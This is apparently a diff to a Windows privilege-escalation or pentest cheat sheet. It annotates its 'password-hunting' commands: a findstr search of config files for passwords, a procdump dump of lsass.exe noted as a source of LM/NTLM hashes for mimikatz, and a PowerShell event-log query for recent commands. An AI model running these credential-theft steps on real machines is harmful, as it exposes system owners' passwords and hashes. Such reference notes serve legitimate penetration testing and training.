@@ -32,9 +32,9 @@ netstat -a
 
 ### password-hunting
 
-findstr /si password *.txt *.ini *.config
-procdump.exe -accepteula -ma <proc_name_tasklist>
-Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
+findstr /si password *.txt *.ini *.config                                       | checks for the word password in all the following file types .txt,.ini,.config
+C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp                             | dumps the lsass. process, you can extract lM/NTLM hashes from it with mimikatz
+Get-WinEvent -LogName "windows Powershell" | select -First 30| Out-GridView     | Selects the last 30 executed powershell command on the system
 
 ### service-enum
 
